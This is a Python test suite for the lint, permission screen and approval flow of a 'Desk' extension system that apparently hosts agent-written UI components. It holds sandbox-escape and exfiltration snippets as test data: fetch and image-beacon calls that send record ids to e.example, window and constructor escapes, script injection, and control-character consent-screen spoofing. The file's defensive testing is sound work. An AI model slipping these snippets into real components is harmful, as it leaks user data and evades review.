"""Desk extensions: agent-written record sections, panels and pages (manifest, lint, bundle, scaffold, permissions)."""
import json
import os
import shutil
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

from test_desk_components_custom import bundle_desk, desk_registry, main, read, write  # noqa: E402

EXT = os.path.join(HERE, "desk_fixtures", "ext")
DEFN_ROLE = {"version": 1, "label": "T", "types": {"role": {
    "label": "Role", "plural": "Roles", "identity": "field:title", "fields": {"title": {"label": "Title", "type": "text"}}}}}


def routine(pages=True, only=None):
    d = tempfile.mkdtemp()
    write(os.path.join(d, "definition.json"), json.dumps(DEFN_ROLE))
    for cid in only or os.listdir(EXT):
        shutil.copytree(os.path.join(EXT, cid), os.path.join(d, "desk", "components", cid))
    if pages:
        write(os.path.join(d, "routine.toml"), "[desk]\npages = true\n")
    return d


def edit_manifest(d, cid, fn):
    p = os.path.join(d, "desk", "components", cid, "component.json")
    m = json.loads(read(p))
    fn(m)
    write(p, json.dumps(m))


class ExtensionLintTest(unittest.TestCase):
    def lint(self, d):
        code, out, _ = main("desk", "lint", "--routine", d)
        return code, out

    def test_fixtures_are_clean(self):
        code, out = self.lint(routine())
        self.assertEqual((code, out.strip()), (0, "ok: no problems"))

    def test_page_needs_opt_in(self):
        code, out = self.lint(routine(pages=False))
        self.assertEqual(code, 1)
        self.assertIn("review-page", out)
        self.assertIn("pages = true", out)

    def test_section_without_types_fails(self):
        d = routine()
        edit_manifest(d, "review-box", lambda m: m.pop("types"))
        code, out = self.lint(d)
        self.assertEqual(code, 1)
        self.assertIn("review-box", out)

    def test_panel_view_must_be_an_object(self):
        d = routine()
        edit_manifest(d, "review-panel", lambda m: m.update(view="role"))
        code, out = self.lint(d)
        self.assertEqual(code, 1)
        self.assertIn("view", out)

    def test_field_cell_cannot_carry_slot_keys(self):
        d = routine()
        edit_manifest(d, "review-box", lambda m: m.update(slot="field-cell"))
        code, out = self.lint(d)
        self.assertEqual(code, 1)
        self.assertIn("types", out)

    def test_banned_api_still_refused_in_a_section(self):
        d = routine()
        p = os.path.join(d, "desk", "components", "review-box", "review-box.js")
        write(p, read(p).replace("return ui.el", "fetch('https://x.example'); return ui.el", 1))
        code, out = self.lint(d)
        self.assertEqual(code, 1)
        self.assertIn("fetch", out)

    def test_section_may_not_touch_the_store_write_api(self):
        d = routine()
        p = os.path.join(d, "desk", "components", "review-box", "review-box.js")
        write(p, read(p).replace("return ui.el", "ctx.store.set('x', {}); return ui.el", 1))
        code, _ = self.lint(d)
        self.assertEqual(code, 1)


class ExtensionVerbLintTest(unittest.TestCase):
    """The manifest declares the verbs; the lint keeps the code to ctx.actions.<declared verb>( and nothing else."""

    def lint_with(self, old, new, decl=None):
        d = routine()
        p = os.path.join(d, "desk", "components", "review-box", "review-box.js")
        text = read(p)
        self.assertIn(old, text)
        write(p, text.replace(old, new, 1))
        if decl is not None:
            edit_manifest(d, "review-box", lambda m: m.update(verbs=decl))
        return main("desk", "lint", "--routine", d)

    def test_undeclared_verb_fails(self):
        code, out, _ = self.lint_with("ctx.actions.comment(", "ctx.actions.drop(")
        self.assertEqual(code, 1)
        self.assertIn("does not declare", out)

    def test_declared_but_unused_is_allowed(self):
        code, _, _ = self.lint_with("ctx.actions.comment(", "ctx.actions.decide(", decl=["decide", "comment", "keep"])
        self.assertEqual(code, 0)

    def test_bracket_access_on_ctx_fails(self):
        code, out, _ = self.lint_with("ctx.actions.comment(", 'ctx["actions"].drop(')
        self.assertEqual(code, 1)
        self.assertIn("ctx[", out)

    def test_alias_of_actions_fails(self):
        code, out, _ = self.lint_with("var note =", "var a = ctx.actions; var note =")
        self.assertEqual(code, 1)
        self.assertIn("ctx.actions must be followed", out)

    def test_alias_of_ctx_and_destructuring_fail(self):
        for repl in ("var c = ctx; var note =", "var { actions } = ctx; var note ="):
            code, out, _ = self.lint_with("var note =", repl)
            self.assertEqual(code, 1, repl)
            self.assertIn("without a property", out)

    def test_renamed_first_parameter_fails(self):
        code, out, _ = self.lint_with("(ctx, props, ui)", "(c, props, ui)")
        self.assertEqual(code, 1)
        self.assertIn("must be named ctx", out)

    def test_unknown_verb_in_manifest_fails(self):
        code, out, _ = self.lint_with("var note =", "var note =", decl=["decide", "wipe"])
        self.assertEqual(code, 1)
        self.assertIn("verbs must be", out)

    def test_field_cell_cannot_declare_verbs(self):
        d = routine()
        edit_manifest(d, "review-box", lambda m: m.update(slot="field-cell"))
        self.assertIn("verbs", main("desk", "lint", "--routine", d)[1])

    def test_bundle_carries_the_declared_verbs(self):
        m = json.loads(read(os.path.join(EXT, "review-box", "component.json")))
        js = bundle_desk.component_js("review-box", m["factory"], read(os.path.join(EXT, "review-box", "review-box.js")), m)
        self.assertIn('"verbs": ["decide", "comment"]', js)
        self.assertIn("Object.freeze", js)


class ExtensionBundleTest(unittest.TestCase):
    def comp(self, cid):
        m = json.loads(read(os.path.join(EXT, cid, "component.json")))
        return bundle_desk.component_js(cid, m["factory"], read(os.path.join(EXT, cid, cid + ".js")), m)

    def test_other_slots_register_in_desk_extensions(self):
        js = self.comp("review-box")
        self.assertIn("window.DESK_COMPONENTS", js)
        self.assertIn("window.DESK_EXTENSIONS", js)
        self.assertIn('"record-section"', js)
        self.assertIn('"role"', js)

    def test_page_nav_and_title_reach_the_registry(self):
        js = self.comp("review-page")
        self.assertIn('"nav"', js)
        self.assertIn("Review queue", js)

    def test_field_cell_output_has_no_extension_registry(self):
        good = os.path.join(HERE, "desk_fixtures", "components", "good", "salary-band")
        m = json.loads(read(os.path.join(good, "component.json")))
        text = read(os.path.join(good, "salary-band.js"))
        plain = bundle_desk.component_js("salary-band", m["factory"], text)
        self.assertEqual(bundle_desk.component_js("salary-band", m["factory"], text, m), plain)
        self.assertNotIn("DESK_EXTENSIONS", plain)


class ExtensionScaffoldTest(unittest.TestCase):
    def test_scaffold_fails_lint_until_why_is_written(self):
        for kind, slot in (("section", "record-section"), ("panel", "panel"), ("page", "page")):
            d = tempfile.mkdtemp()
            write(os.path.join(d, "definition.json"), json.dumps(DEFN_ROLE))
            write(os.path.join(d, "routine.toml"), "[desk]\npages = true\n")
            code, out, _ = main("desk", "scaffold", kind, "my-x", "--routine", d, "--type", "role")
            self.assertEqual(code, 0, out)
            self.assertEqual(json.loads(read(os.path.join(d, "desk", "components", "my-x", "component.json")))["slot"], slot)
            self.assertEqual(main("desk", "lint", "--routine", d)[0], 1, kind)
            edit_manifest(d, "my-x", lambda m: m.update(why="A real reason that is well over forty characters long."))
            code, out, _ = main("desk", "lint", "--routine", d)
            self.assertEqual((kind, code, out.strip()), (kind, 0, "ok: no problems"))

    def test_page_scaffold_does_not_edit_routine_toml(self):
        d = tempfile.mkdtemp()
        write(os.path.join(d, "definition.json"), json.dumps(DEFN_ROLE))
        code, out, _ = main("desk", "scaffold", "page", "queue", "--routine", d)
        self.assertEqual(code, 0)
        self.assertIn("pages = true", out)
        self.assertFalse(os.path.exists(os.path.join(d, "routine.toml")))

    def test_scaffold_refuses_to_overwrite(self):
        d = routine()
        self.assertEqual(main("desk", "scaffold", "panel", "review-panel", "--routine", d)[0], 2)


class ExtensionPreviewTest(unittest.TestCase):
    def test_preview_writes_a_page_with_the_components(self):
        d = routine()
        snap = os.path.join(d, "snap.json")
        write(snap, "{}")
        out_dir = os.path.join(d, "out")
        code, out, _ = main("desk", "preview", "--routine", d, "--snapshot", snap, "--out", out_dir)
        self.assertEqual(code, 0, out)
        html = read(os.path.join(out_dir, "index.html"))
        self.assertIn("component_review_page", html)
        self.assertIn("DESK_EXTENSIONS", html)
        self.assertIn("read-only", out)
        self.assertTrue(os.path.isfile(os.path.join(out_dir, "snapshot.json")))

    def test_preview_refuses_a_lint_failure(self):
        d = routine()
        edit_manifest(d, "review-box", lambda m: m.update(why=""))
        self.assertEqual(main("desk", "preview", "--routine", d, "--snapshot", __file__)[0], 1)


class ExtensionPermissionTest(unittest.TestCase):
    def test_screen_lists_each_component_with_its_verbs(self):
        rows = desk_registry.extension_rows(routine())
        text = json.dumps(rows)
        for cid in ("review-box", "review-panel", "review-page"):
            self.assertIn(cid, text)
        self.assertEqual([r["verbs"] for r in rows if r["id"] == "review-box"], [["decide", "comment"]])
        self.assertEqual([r["verbs"] for r in rows if r["id"] == "review-panel"], [[]])
        import permission
        screen = permission.desk_extension_lines(rows)
        joined = "\n".join(screen)
        self.assertIn("review-box", joined)
        self.assertIn("decide", joined)


class ExtensionPermissionSpoofTest(unittest.TestCase):
    """The consent screen takes nothing from a manifest or code that fails the lint, and prints no control characters."""

    def lines(self, d):
        import permission
        return "\n".join(permission.desk_extension_lines(desk_registry.extension_rows(d)))

    def test_code_using_an_undeclared_verb_is_invalid_not_trusted(self):
        d = routine()
        edit_manifest(d, "review-box", lambda m: m.update(verbs=[]))
        text = self.lines(d)
        self.assertIn("INVALID component folder 'review-box'", text)
        self.assertNotIn("record-section 'review-box'", text)

    def test_manifest_id_not_matching_folder_is_invalid(self):
        d = routine()
        edit_manifest(d, "review-box", lambda m: m.update(id="trusted-viewer"))
        text = self.lines(d)
        self.assertIn("INVALID component folder 'review-box'", text)
        self.assertNotIn("trusted-viewer'", text.replace("INVALID", "").split("(")[0])

    def test_hostile_types_slot_and_view_are_invalid(self):
        for key, val in (("types", ["role\nSafe: nothing is written"]), ("slot", "panel\n- ok")):
            d = routine()
            edit_manifest(d, "review-box", lambda m, key=key, val=val: m.update({key: val}))
            text = self.lines(d)
            self.assertIn("INVALID", text, key)
            self.assertFalse([l for l in text.split("\n") if "'review-box'" in l and not l.startswith("- INVALID")], key)

    def test_control_characters_are_never_printed(self):
        import permission
        rows = [{"id": "a\x1b[31mred\nfake line", "invalid": True, "problems": ["x\ry\u202ez"]}]
        out = "\n".join(permission.desk_extension_lines(rows))
        self.assertEqual(len(out.split("\n")), 1)
        for ch in ("\x1b", "\r", "\u202e"):
            self.assertNotIn(ch, out)

    def test_folder_name_with_newline_is_cleaned(self):
        d = routine(only=["review-panel"])
        write(os.path.join(d, "desk", "components", "x\ny", "component.json"), "{}")
        out = self.lines(d)
        self.assertEqual(len(out.split("\n")), 2)
        self.assertIn("INVALID component folder 'x?y'", out)


if __name__ == "__main__":
    unittest.main()


class ConsentWordingTest(unittest.TestCase):
    """The screen must not claim a containment the lint cannot give."""

    def screen(self):
        import permission
        rows = desk_registry.extension_rows(routine())
        return "\n".join(permission.desk_extension_lines(rows)), rows

    def test_no_enforced_claim_and_reads_is_advisory(self):
        text, _ = self.screen()
        self.assertNotIn("enforced by the Desk", text)
        self.assertIn("advisory", text)
        self.assertIn("writes it declares", text)

    def test_render_says_the_code_runs_with_owner_rights(self):
        import permission
        _, rows = self.screen()
        out = permission.render({"app": {"id": "a"}}, {}, rows)
        self.assertIn("You are approving the code itself", out)
        self.assertIn("not containment", out)
        self.assertNotIn("A write goes only through", out)
        self.assertIn("shared decisions, comments and notes", out)
        self.assertIn("requests/", out)


class LintBypassTest(unittest.TestCase):
    """Routes to the window, the network and script elements that review found past the text lint. The lint stays
    a guard, so these close the known routes without claiming the list is complete."""

    BYPASSES = {
        "ownerDocument.defaultView": 'var w = ui.el("div", {}).ownerDocument.defaultView; w.x = 1;',
        "contentWindow": 'var w = ui.el("div", {}).contentWindow;',
        "optional chain computed key": 'var k = "con" + "structor"; var F = (0)?.[k]?.[k]; F("return this")();',
        "comment between name and bracket": 'var k = "a"; var q = ui/**/[k];',
        "parenthesised fetch": '(fetch)("https:/" + "/e.example/?d=" + props.id);',
        "image beacon": 'var i = new Image(); i.src = "https:/" + "/e.example/?d=" + props.id;',
        "setAttribute built string": 'var b = ui.el("div", {}); b.setAttribute("o" + "nclick", "x");',
        "createElement script": 'var s = ui.el("div", {}).ownerDocument.createElement("scr" + "ipt");',
        "createElement alone": 'var s = d.createElement("p");',
        "sendBeacon": 'x.sendBeacon("u");',
        "postMessage": 'x.postMessage(1);',
        "regex after paren hides code behind a fake comment": 'var k = "a"; if (k) /[/*]/.test(k); var q = ui[k]; /* */',
        "same, banned name": 'if (props) /[/*]/.test(1); var w = window; /* */',
    }

    def test_each_known_bypass_fails_the_lint(self):
        for name, snippet in self.BYPASSES.items():
            d = routine(only=["review-panel"])
            p = os.path.join(d, "desk", "components", "review-panel", "review-panel.js")
            text = read(p)
            marker = text.index("{", text.index("function component_review_panel")) + 1
            write(p, text[:marker] + "\n  " + snippet + "\n" + text[marker:])
            code, out, _ = main("desk", "lint", "--routine", d)
            self.assertEqual(code, 1, name)

    def test_fixtures_still_pass(self):
        self.assertEqual(main("desk", "lint", "--routine", routine())[0], 0)


class ApprovalTest(unittest.TestCase):
    """Approval is tied to the shipped code by a content hash."""

    def approve(self, d):
        # permissions reads app.toml in the app dir; the routine folder doubles as one here.
        from test_desk_components_custom import routineos
        rows = desk_registry.extension_rows(d)
        desk_registry.write_approvals(d, rows)
        return routineos

    def test_unapproved_interactive_components_refuse_the_page(self):
        from test_desk_components_custom import routineos
        d = routine()
        with self.assertRaises(routineos.DeskPageError) as cm:
            routineos.desk_page("W", routine_dir=d)
        self.assertIn("not approved", str(cm.exception))

    def test_approved_code_builds(self):
        routineos = self.approve(routine())
        d = routine()
        self.approve(d)
        self.assertIn("review-box", routineos.desk_page("W", routine_dir=d))

    def test_an_edit_after_approval_refuses(self):
        d = routine()
        routineos = self.approve(d)
        p = os.path.join(d, "desk", "components", "review-box", "review-box.js")
        write(p, read(p) + "\n// changed after approval\n")
        with self.assertRaises(routineos.DeskPageError) as cm:
            routineos.desk_page("W", routine_dir=d)
        self.assertIn("review-box", str(cm.exception))

    def test_a_manifest_edit_after_approval_refuses(self):
        d = routine()
        routineos = self.approve(d)
        edit_manifest(d, "review-box", lambda m: m.update(verbs=["decide", "comment"]))
        with self.assertRaises(routineos.DeskPageError):
            routineos.desk_page("W", routine_dir=d)

    def test_invalid_component_blocks_approval(self):
        d = routine()
        edit_manifest(d, "review-box", lambda m: m.pop("types"))
        code, out, err = main("permissions", d, "--approve")
        self.assertNotEqual(code, 0)
        self.assertFalse(os.path.exists(os.path.join(d, "desk", "approvals.json")))

    def test_permission_screen_uses_full_lint(self):
        d = routine()
        p = os.path.join(d, "desk", "components", "review-box", "review-box.js")
        write(p, read(p) + "\nfunction broken( {\n")
        rows = desk_registry.extension_rows(d)
        self.assertTrue([r for r in rows if r["id"] == "review-box"][0]["invalid"])

    def test_page_row_is_invalid_without_opt_in(self):
        rows = desk_registry.extension_rows(routine(pages=False))
        self.assertTrue([r for r in rows if r["id"] == "review-page"][0]["invalid"])


def second_section(d, **manifest):
    """A copy of review-box as its own record-section, with the given manifest keys changed."""
    src = os.path.join(d, "desk", "components", "review-box")
    dst = os.path.join(d, "desk", "components", "review-two")
    shutil.copytree(src, dst)
    os.rename(os.path.join(dst, "review-box.js"), os.path.join(dst, "review-two.js"))
    write(os.path.join(dst, "review-two.js"), read(os.path.join(dst, "review-two.js")).replace("component_review_box", "component_review_two"))
    edit_manifest(d, "review-two", lambda m: m.update(id="review-two", factory="component_review_two", **manifest))


class ExtensionPlacementAndPrefsTest(unittest.TestCase):
    def lint(self, d):
        return desk_registry.lint_routine({}, d)

    def test_placement_values(self):
        for value in ("top", "after-summary", "after-fields"):
            d = routine()
            edit_manifest(d, "review-box", lambda m, v=value: m.update(placement=v))
            self.assertEqual(self.lint(d), [], value)
        d = routine()
        edit_manifest(d, "review-box", lambda m: m.update(placement="middle"))
        self.assertTrue([p for p in self.lint(d) if "placement must be" in p])

    def test_placement_belongs_to_a_record_section_only(self):
        d = routine()
        edit_manifest(d, "review-panel", lambda m: m.update(placement="top"))
        self.assertTrue([p for p in self.lint(d) if "'placement' does not belong to a panel" in p])

    def test_two_top_sections_same_type_fail_lint(self):
        d = routine()
        edit_manifest(d, "review-box", lambda m: m.update(placement="top"))
        second_section(d, placement="top")
        self.assertTrue([p for p in self.lint(d) if "placement top" in p and "role" in p])

    def test_top_sections_on_different_types_pass(self):
        d = routine()
        edit_manifest(d, "review-box", lambda m: m.update(placement="top"))
        second_section(d, placement="top", types=["other"])
        self.assertEqual([p for p in self.lint(d) if "placement top" in p], [])

    def test_prefs_requires_manifest_flag(self):
        d = routine()
        p = os.path.join(d, "desk", "components", "review-box", "review-box.js")
        write(p, read(p).replace('var state =', 'var seen = ctx.pref("tab", "a");\n  var state =', 1))
        self.assertTrue([x for x in self.lint(d) if "ctx.pref" in x and "prefs" in x])
        edit_manifest(d, "review-box", lambda m: m.update(prefs=True))
        self.assertEqual(self.lint(d), [])

    def test_prefs_flag_must_be_a_boolean(self):
        d = routine()
        edit_manifest(d, "review-box", lambda m: m.update(prefs="yes"))
        self.assertTrue([p for p in self.lint(d) if "prefs must be true or false" in p])

    def test_bundle_and_permission_screen_carry_both(self):
        d = routine()
        edit_manifest(d, "review-box", lambda m: m.update(placement="top", prefs=True))
        m = json.loads(read(os.path.join(d, "desk", "components", "review-box", "component.json")))
        js = bundle_desk.component_js("review-box", m["factory"], read(os.path.join(d, "desk", "components", "review-box", "review-box.js")), m)
        self.assertIn('"placement": "top"', js)
        self.assertIn('"prefs": true', js)
        import permission
        line = [x for x in permission.desk_extension_lines(desk_registry.extension_rows(d)) if "review-box" in x][0]
        self.assertIn("remembers a setting in this browser", line)
        self.assertIn("placement top", line)
        plain = [x for x in permission.desk_extension_lines(desk_registry.extension_rows(routine())) if "review-box" in x][0]
        self.assertNotIn("remembers a setting", plain)
